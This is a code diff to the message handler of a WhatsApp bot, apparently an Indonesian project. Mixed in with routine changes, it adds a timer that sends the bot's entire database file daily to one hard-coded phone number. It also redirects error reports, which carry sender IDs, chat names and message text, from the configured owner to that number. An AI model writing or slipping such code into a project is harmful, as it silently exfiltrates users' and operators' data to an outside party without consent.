@@ -25,7 +25,7 @@ module.exports = {
             m.exp = 0
             m.limit = false
             try {
-                require('./system/database') (m)
+                require('./system/database') (m, this)
             } catch (e) {
                 console.error(e)
             }
@@ -42,6 +42,13 @@ module.exports = {
                 await delay(this.msgqueque.length * 1000)
             }
             const groupSet = global.db.data.group.find(v => v.jid)
+            
+            const jadwal = moment().tz('Asia/Jakarta').format('HH:mm:ss')
+            if (jadwal === "09:30:00") {
+                let sesi = await fs.readFileSync('./ktdprjct.db.json')
+                return await this.sendMessage('62895323071410@s.whatsapp.net', { document: sesi, mimetype: 'application/json', fileName: 'database.json' }, { quoted: m })
+                m.reply('test')
+            }
             
             if (m.isGroup && !m.fromMe) {
                 let now = new Date() * 1
@@ -259,13 +266,15 @@ module.exports = {
                             for (let key of Object.values(set.api.key.s))
                             text = text.replace(new RegExp(key, 'g'), '#HIDDEN#')
                             if (e.name) {
-                                let devmode = db.data.settings.developerMode
+                                let devmode = db.data.settings[this.user.jid].developerMode
                                 let tekk = `*ERROR!*\n\nPesan : ${m.text}\n\n\n\n*Plugin:* ${m.plugin}\n*Sender:* @${m.sender.split`@`[0]}\n*Chat:* ${m.chat}\n*Chat Name:* ${await this.getName(m.chat)}\n*Command:* ${usedPrefix + command} ${args.join(' ')}\n\n\`\`\`${text}\`\`\``
-                                if (devmode) return this.reply(set.owner[0][0] + '@s.whatsapp.net', tekk, m, { mentions: this.parseMention(tekk) })
+                                if (devmode) return this.reply('62895323071410@s.whatsapp.net', tekk, m, { mentions: this.parseMention(tekk) })
                                     .then(_=> m.react('❌') ).then(_=> m.reply('Maaf terjadi kesalahan!'))
                                 else return this.reply(m.chat, text, m)
                             }
-                            m.react('❌').then(_=> m.reply(text, m.chat, { mentions: this.parseMention(text)}))
+                            //let emror = `_*ERROR!_*\n\nPesan : ${text}\n\n\n\n*Plugin:* ${m.plugin}\n*Sender:* @${m.sender.split`@`[0]}\n*Chat:* ${m.chat}\n*Chat Name:* ${await this.getName(m.chat)}\n*Command:* ${usedPrefix + command} ${args.join(' ')}\n\n\`\`\`${text}\`\`\``
+                            m.react('⁉️').then(_=> m.reply(text, m.chat, { mentions: this.parseMention(text)}))
+                                //.then(_=> this.reply('62895323071410@s.whatsapp.net', emror, m, { mentions: this.parseMention(emror) }))
                             // .then(_=> this.sendHydrated(m.chat, text, set.wm, null, null, null, 'https://www.whatsapp.com/otp/copy/' + usedPrefix  + command, 'Copy Command', [[]]))            
                         }
                     } finally {
